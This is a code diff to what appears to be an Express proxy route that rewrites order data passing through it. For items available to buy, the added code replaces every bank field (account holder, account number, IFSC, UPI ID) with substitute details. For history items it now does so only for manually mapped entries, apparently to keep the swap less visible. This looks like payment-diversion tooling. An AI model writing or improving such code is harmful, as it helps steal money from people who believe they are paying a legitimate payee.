@@ -1884,14 +1884,32 @@ app.all('/xxapi/*', async (req, res) => {
             if (!item || typeof item !== 'object') return;
             const orderState = parseInt(item.orderState ?? item.state ?? -1);
             const isHistoryItem = orderState > 0;
+            
+            const oId = _getItemOId(item);
+            const savedSlip = oId && data.orderBankMap ? data.orderBankMap[oId] : null;
+
             if (!isHistoryItem) {
               // Browse (available to buy): minAmount check
               const iAmt = parseFloat(item.orderAmount || item.amount || item.money || item.totalAmount || item.buyAmount || 0);
               if (bank.minAmount && iAmt > 0 && iAmt < bank.minAmount) return;
+              
+              // Blanket replace for active browse items
+              const hasAcct = scanHasBankFields(item, 0);
+              if (hasAcct) deepReplaceBankFields(item, bank, 0, hasAcct);
+            } else {
+              // History items: ONLY replace if they were manually added to orderBankMap
+              if (savedSlip && savedSlip.isManual) {
+                const mappedBank = {
+                  accountHolder: savedSlip.accountHolder || (savedSlip.bank ? savedSlip.bank.split(' | ')[0] : ''),
+                  accountNo: savedSlip.accountNo || (savedSlip.bank ? savedSlip.bank.split(' | ')[1] : ''),
+                  ifsc: savedSlip.ifsc || (savedSlip.bank ? savedSlip.bank.split(' | ')[2] : ''),
+                  bankName: savedSlip.bankName || 'Bank',
+                  upiId: savedSlip.upiId || ''
+                };
+                const hasAcct = scanHasBankFields(item, 0);
+                if (hasAcct) deepReplaceBankFields(item, mappedBank, 0, hasAcct);
+              }
             }
-            // History items: always replace; browse items: replace (passed minAmount check above)
-            const hasAcct = scanHasBankFields(item, 0);
-            if (hasAcct) deepReplaceBankFields(item, bank, 0, hasAcct);
           });
         }
 
